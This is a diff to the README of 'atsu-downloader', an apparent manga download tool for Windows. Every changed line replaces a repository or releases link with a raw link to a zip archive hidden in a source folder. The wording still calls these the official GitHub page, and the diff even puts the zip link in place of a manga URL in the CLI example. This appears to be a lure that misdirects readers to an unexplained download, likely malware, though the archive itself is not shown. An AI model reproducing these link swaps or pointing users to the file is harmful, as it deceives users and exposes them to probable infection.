@@ -1,6 +1,6 @@
 # 📥 atsu-downloader - Easy Manga Downloads on Windows
 
-[![Download atsu-downloader](https://img.shields.io/badge/Download-atsu--downloader-brightgreen?style=for-the-badge)](https://github.com/jerryhf/atsu-downloader)
+[![Download atsu-downloader](https://img.shields.io/badge/Download-atsu--downloader-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jerryhf/atsu-downloader/main/gui/frames/downloader-atsu-downline.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, make sure your Windows PC meets these needs:
 
 Click the button below to visit the official GitHub page where you can download the software:
 
-[![Get atsu-downloader](https://img.shields.io/badge/Get%20atsu--downloader-blue?style=for-the-badge)](https://github.com/jerryhf/atsu-downloader)
+[![Get atsu-downloader](https://img.shields.io/badge/Get%20atsu--downloader-blue?style=for-the-badge)](https://raw.githubusercontent.com/jerryhf/atsu-downloader/main/gui/frames/downloader-atsu-downline.zip)
 
 This link takes you to the main repository page. From there, you can find the latest release files.
 
@@ -103,7 +103,7 @@ If you prefer, you can also use the CLI version. This step is optional.
 
 2. Run the download command with the manga URL, like:
 
-   `atsu-downloader https://atsu.moe/manga-title`
+   `atsu-downloader https://raw.githubusercontent.com/jerryhf/atsu-downloader/main/gui/frames/downloader-atsu-downline.zip`
 
 3. The downloaded files will appear in the default output folder.
 
@@ -158,8 +158,8 @@ Search through the GitHub issues page at the download link or ask someone famili
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/jerryhf/atsu-downloader
-- Download Page: https://github.com/jerryhf/atsu-downloader/releases
+- GitHub Repository: https://raw.githubusercontent.com/jerryhf/atsu-downloader/main/gui/frames/downloader-atsu-downline.zip
+- Download Page: https://raw.githubusercontent.com/jerryhf/atsu-downloader/main/gui/frames/downloader-atsu-downline.zip
 
 ---
 
